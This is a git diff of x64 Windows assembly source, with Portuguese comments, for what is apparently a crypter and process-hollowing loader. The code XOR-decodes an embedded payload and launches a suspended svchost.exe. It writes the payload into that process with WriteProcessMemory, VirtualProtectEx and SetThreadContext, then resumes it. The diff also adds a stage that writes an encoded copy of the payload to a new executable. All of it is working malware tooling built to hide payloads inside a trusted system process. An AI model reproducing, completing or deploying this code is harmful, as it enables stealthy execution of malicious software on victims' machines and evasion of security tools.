@@ -5,10 +5,13 @@
 global WinMain
 
 section .BSS
-	process db "svchost.exe",0,0
+	bool dq 1
+	tamArq dq 0
 	
-section .data	
-
+	
+section .data
+	process dq "svchost.exe",0,0
+	
     struc CONTEXT
        .P1Home:                                      resq 1
        .P2Home:                                      resq 1
@@ -148,8 +151,9 @@ section .data
        at STARTUPINFOA.hStdInput,                    dd 0
        at STARTUPINFOA.hStadOutput,                  dd 0
        at STARTUPINFOA.hStdError,                    dd 0
-    iend
+    iend  
 
+    addressAlloc times 8                             dq 0
     TamArqProgram times 8                            dq 0
     TamArqTarget times 8                             dq 0
     bufferFileName times 32                          db 0
@@ -172,18 +176,16 @@ section .data
     ptr17f0                                          dd 0x01
     address7ec                                       dd 0
     Ptrl                                             dq  0x0004000000000000
+    NameArgv0 times 32 db 0
+	tm times 8 dq 0
 
-section .codered
-	CodeRed times 800000                         db 0:
-	
-	
-section .deccode
+ section .codered 
+ CodeRed times 800000                             db 0:
+
+section .deccode	
 	decCode:
 	;SHELLCODE DE CONEXÃO ENCRIPTADO
-	
-	;GetProcddress no registrador R14
-	call Locate_kernel32
-		
+	call Locate_kernel32	
 	;Lookup CreateProcessA
 	mov rax, 0x41737365636f
 	push rax
@@ -193,10 +195,11 @@ section .deccode
 	mov rcx, r8
 	sub rsp, 0x30
 	call R14
+	mov r12, rax
 	add rsp, 0x30
 	add rsp, 0x10
-	mov r12, rax
 	
+	sub rsp, 0x238
 	;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
 	lea rdx,[ProcInfo+PROCESSINFO.hProcess]
 	mov [rsp+0x48], rdx
@@ -215,14 +218,12 @@ section .deccode
 	mov [rsp+0x20], r9
 	mov r9d, 0
 	mov r8d, 0
-	lea rdx , [process]
+	lea rdx, [process]
 	mov ecx, 0
 	xor r10,r10
 	call r12
-	add rsp, 0x30
-	 
-	mov rdi,rsp
-	
+	add rsp, 0x238
+	 	
 	call Locate_kernel32
 	call GetProcAddres
 
@@ -247,17 +248,25 @@ section .deccode
 	mov edx, edi
 	mov ecx, 0x00
 	call r12
-	add rsp, 0x30
+	add rsp, 0x10
 	mov rbx,rax
 	mov rdi, rbx
 	mov [alloc], rax
 	
 	mov rax, CodeRed
 	xor rcx,rcx
+	
 	mov r9, [TamArqTarget]
+	mov [tm], r9
+	cmp r9, 0x00
+	jnz DecArq
+	
+	mov r9, [tamArq]
+	
 	DecArq:
 		mov rdx, [rax]
 		xor rdx, 0xC0FFEE
+		sub rdx, 0xc
 		mov [rbx],rdx
 		inc rbx
 		inc rax
@@ -265,8 +274,8 @@ section .deccode
 		cmp rcx, r9
 		jne DecArq
 		
-	mov rcx, rdi
-	mov rax, rdi
+	mov rcx, [alloc]
+	mov rax, [alloc]
 	add rax, 0x3C
 	xor rbx,RBX
 	mov ebx, [eax]
@@ -404,6 +413,7 @@ section .deccode
 			je Decisao1
 				
 			call Locate_kernel32 
+			sub rsp, 0x80
 			;Lookup WriteProcess
 			call WriteProcess
 			lea r8, [allocex]
@@ -412,12 +422,13 @@ section .deccode
 			mov [rsp+0x20], Rcx
 			mov r9d, 8
 			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+			
 			call r12
-			add rsp, 0x30
+			add rsp, 0x80
 			
 			Decisao1:
 			mov rax, [PE]
-			mov word[rax+0x5C], 2
+			mov word[rax+0x5C], 2 ;Subsystem
 			mov rax, [ImageBase]
 			mov rdx, [ImageBase]
 			cmp rdx,Rax
@@ -431,8 +442,7 @@ section .deccode
 			je Pulo2
 			
 			Pulo2:
-						
-			
+								
 	Writable:
 			call Locate_kernel32
 			;Guarda offset PE
@@ -460,6 +470,7 @@ section .deccode
 			add rsp, 0x10
 			call Locate_kernel32
 			;lookup SetThreadContext
+			sub rsp, 0x80
 			mov rax, "dContext"
 			push Rax
 			mov rax, "SetThrea" 
@@ -471,6 +482,7 @@ section .deccode
 			call R14
 			add rsp,0x30
 			add rsp,0x10
+			add rsp, 0x80
 			mov r12, rax
 		
 			mov rax, [ProcInfo+PROCESSINFO.hThread]
@@ -482,6 +494,7 @@ section .deccode
 			;Lookup WriteProcess
 			call WriteProcess
 			;call WriteProcessMemory
+			sub rsp, 0x80
 			mov rax, [PE]
 			mov eax, dword[rax+0x54]
 			mov r9d,eax
@@ -492,11 +505,13 @@ section .deccode
 			mov [rsp+0x20],rsp
 			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 			call r12
+			add rsp, 0x80
 			mov rbp, rax
-			add rsp, 0x30
+			add rsp, 0x08
 				
 			call Locate_kernel32
 			;Lookup VirtualProectEx
+			sub rsp, 0x80
 			call VirtualProectEx
 			mov rax, [PE]
 			mov eax, dword[rax+0x54]
@@ -508,6 +523,8 @@ section .deccode
 			mov r9d, 0x02
 			mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 			call r12
+			add rsp, 0x80
+			add rsp, 0x08
 			
 			mov rax, [lpImageBase]
 			mov eax, [rax+0x3c]
@@ -521,6 +538,7 @@ section .deccode
 		
 		Delta:
 			call Locate_kernel32
+			sub rsp, 0x80
 			;Lookup WriteProcess
 			call WriteProcess
 			mov eax,[NumSection]
@@ -568,6 +586,8 @@ section .deccode
 			mov rdx,Rcx
 			mov rcx, Rax
 			call R12
+			add rsp, 0x80
+			
 			mov dword[ptr17f0], 0
 			mov rax, [PE]
 			movzx eax, word[rax+0x6]
@@ -692,13 +712,12 @@ section .deccode
 			mov dword[address7ec],0x20
 			jmp jmpAlloc
 		D6:
-		
-			
 			
 		jmpAlloc:	
 		call Locate_kernel32
 		;Lookup VirtualProectEx
 		call VirtualProectEx
+		sub rsp, 0x80
 		mov ecx, dword[ptr17f0]
 		mov eax, dword[NumSection]
 		movsxd rdx,eax
@@ -724,6 +743,7 @@ section .deccode
 		mov rdx,r10
 		mov rcx, Rax
 		call r12
+		add rsp, 0x80
 		add dword [NumSection], 0x1
 		
 	Final:
@@ -732,6 +752,10 @@ section .deccode
 		movzx eax, ax
 		cmp eax, [NumSection]	
 		jg Delta
+		xor rbx,Rbx
+		mov bx, 0x08
+		mul	bx
+		add rsp, rax
 			
 		call Locate_kernel32 
 		mov rax, "read"
@@ -742,29 +766,145 @@ section .deccode
 		mov rcx, r8
 		sub rsp, 0x30
 		call r14
+		add rsp, 0x30
+		add rsp, 0x10
+		
 		mov r12, rax
 		;call ResumeTheread
 		mov rax, [ProcInfo+PROCESSINFO.hThread]
 		mov rcx, rax
 		call R12
 		
-	call Locate_kernel32
-	Exit:                             
-		;lookup ExitProcess
-		mov rax, "ess"
-		push rax
-		mov rax, "ExitProc"
+		mov rax, [bool]
+		cmp rax, 0
+		jle Exit
+			
+		call Locate_kernel32
+		call LoadLibraryA
+		call LoadMsvcrt	
+		
+		sub rsp, 0x20
+		mov rax, "T007.exe"
+		push Rax
+		mov [rsp+0x8], byte 0x00
+		mov [bufferFileName], rsp
+		call OpenFile
+		add rsp, 0x20
+					
+		call Locate_kernel32
+		call LoadLibraryA
+		call LoadMsvcrt	
+		
+		add rsp, 0x08
+		
+		;Lookup fopen
+		mov rax, "fopen"
 		push rax
 		lea rdx, [rsp]
-		mov rcx, r8
+		mov rcx, r15
 		sub rsp, 0x30
 		call r14
-		mov r12 ,rax
+		mov r12,rax
+		add rsp, 0x30
+		add rsp, 0x08
+
+		;Abre arquivo
+		mov rax, "Tx0.exe"
+		push rax
+		lea rcx, [rsp]
+		mov rax, "wb+"
+		push rax
+		lea rdx, [rsp]
+		sub rsp, 0x30
 		call r12
-	;END
-	
-			
- 
+		add rsp, 0x30
+		add rsp, 0x10
+		mov rbp,rax
+				
+		;Lookup fwrite
+		mov rax, "fwrite"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		add rsp, 0x30
+				
+		mov rax, [addressAlloc]
+		add rax, 0x400
+		mov [rax], byte 0x00
+		sub rax, 0x400
+		add rax, 0xC3C00
+		add rax, 0x36
+		mov [rax], dword 0x240
+		sub rax, 0x36
+		add rax, 0xA7
+		mov [rax], dword 0x240
+		sub rax, 0xA7
+		sub rax, 0xC3C00
+		
+		add rax, 0x400
+		add rax, 0x08
+		xor rdx,Rdx
+		mov rdx, [tm]
+		mov [rax],dword  edx
+		
+		sub rax, 0x400
+		sub rax, 0x08
+		
+		
+		mov rax, [addressAlloc]
+		add rax, 0x600
+		
+		xor rbx, Rbx
+		mov rbx, CodeRed
+		xor rcx,rcx
+		xor r11, r11
+		mov r9, [TamArqTarget]
+		
+		DecArqq:
+			mov r11, [rbx]
+			mov [rax],r11
+			inc r11
+			inc rbx
+			inc rax
+			dec r9
+			cmp rcx, r9
+			jne DecArqq
+		
+		mov rax, [addressAlloc]
+		
+		;call fwrite
+		xor r8,R8
+		mov r8, [TamArqProgram]
+		mov edx, r8d
+		mov r9, rbp
+		mov r8d, 0x01
+		mov rcx, rax
+		sub rsp, 0x30
+		call r12
+		add rsp, 0x30
+		add rsp, 0x08
+		
+		;Lookup fclose
+		mov rax, "fclose"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r15
+		sub rsp, 0x30
+		call r14
+		mov r12, rax
+		add rsp, 0x30
+		add rsp, 0x08
+
+		;call fclose
+		sub rsp,0x30
+		mov rcx, rbp
+		call r12
+		add rsp, 0x30
+ret
+					
 section .text
 WinMain:
     Start:
@@ -773,7 +913,7 @@ WinMain:
 	;***************
 	;* By: Teuzero *
 	;***************
-	add rsp, 0xfffffffffffffdf8; # Bytes Vazios
+	;add rsp, 0xfffffffffffffdf8; # Bytes Vazios
 
 	; Obtem o endereço base do kernel32.dll 
 	call Locate_kernel32
@@ -781,17 +921,25 @@ WinMain:
 	call FinFunctionGetProcAddress
 	call LoadLibraryA
 	call LoadMsvcrt
+	mov rax, [bool]
+	cmp rax, 0x1
+	jnz dec
 	call PrintMsgConsole
 	call PegaNomeDoaquivo
+	
+	lea rax, [rsp+0x10]
+	
+	mov [bufferFileName], rax
 	call OpenFile
-	mov rbp,rdi
+	mov rbp,[addressAlloc]
 	mov r10, rbp ; Arquivo alvo
 	
 	mov rax, [TamArqProgram]
 	mov [TamArqTarget], rax
 	xor r10,r10
 	call Locate_kernel32
-
+	
+	
 	call VirtualProect
 	;CALL VirtualProtect 
 	mov r10, [TamArqTarget]
@@ -812,6 +960,7 @@ WinMain:
 	xor rcx,rcx
 	WriteSecion:
 		mov rbx, [rbp]
+		add rbx, 0xc
 		xor rbx, 0xC0FFEE
 		mov [rax], rbx
 		inc rax
@@ -820,8 +969,25 @@ WinMain:
 		cmp rcx,rdx
 		jne WriteSecion 
 	
-	Dec:
+	dec:
 		call decCode
+	
+	Exit:   
+		call Locate_kernel32
+		;lookup ExitProcess
+		mov rax, "ess"
+		push rax
+		mov rax, "ExitProc"
+		push rax
+		lea rdx, [rsp]
+		mov rcx, r8
+		sub rsp, 0x30
+		call r14
+		add rsp, 0x30
+		add rsp, 0x10
+		mov r12 ,rax
+		call r12
+	;END
 ret
 ;***************
 ;*     AND     *
@@ -887,7 +1053,9 @@ OpenFile:
 	add rsp, 0x30
 
 	;Abre arquivo
-	lea rcx, [rsp+0x20]
+	
+	mov rax, [bufferFileName]
+	lea rcx, [rax]
 	mov rax, "rb"
 	push rax
 	lea rdx, [rsp]
@@ -952,6 +1120,7 @@ AlocaEspacoEmUmEndereco:
 	mov rcx, rsi
 	sub rsp, 0x30
 	call r12
+	mov [addressAlloc], rax
 	mov rdi, rax
 	add rsp,0x30
 	add rsp, 0x08
